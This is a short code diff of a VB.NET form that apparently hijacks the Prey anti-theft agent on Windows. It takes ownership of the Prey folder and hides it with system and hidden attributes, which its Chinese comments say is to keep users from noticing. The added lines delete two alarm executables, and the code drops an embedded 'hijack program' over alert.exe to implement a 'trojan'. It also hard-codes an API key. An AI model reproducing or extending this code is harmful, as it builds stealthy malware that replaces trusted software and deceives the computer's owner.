@@ -8,6 +8,7 @@ Public Class DisplayForm
     Dim PreyDirectroy As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) & "\Prey"
     Dim PreyVireion As String = "1.6.3"
     Dim FlashDirectroy As String = PreyDirectroy & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
+    Dim AlarmDirectory As String = PreyDirectroy & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"
     Dim APIKEY As String = "A4E064ED041C"
 
     Private Sub DisplayForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
@@ -42,6 +43,10 @@ Public Class DisplayForm
         Shell("cmd.exe /c takeown /f " & PreyDirectroy & "/ /r /d y && icacls " & PreyDirectroy & "/ /grant administrators:F /t", vbHide, True)
         '对 Prey 目录添加 [系统] 和 [隐藏] 属性，防止用户无意发现文件
         Shell("cmd.exe /c attrib " & PreyDirectroy & " +s +h", vbHide, True)
+
+        '删除 Alarm 目录里的两个 exe ，劫持以实现恢复木马
+        If IO.File.Exists(AlarmDirectory & "mpg123.exe") Then IO.File.Delete(AlarmDirectory & "mpg123.exe")
+        If IO.File.Exists(AlarmDirectory & "voladjust.exe") Then IO.File.Delete(AlarmDirectory & "voladjust.exe")
 
         '释放劫持程序
         SaveResourceFile(My.Resources.BinaryResource.alert, FlashDirectroy & "alert.exe")
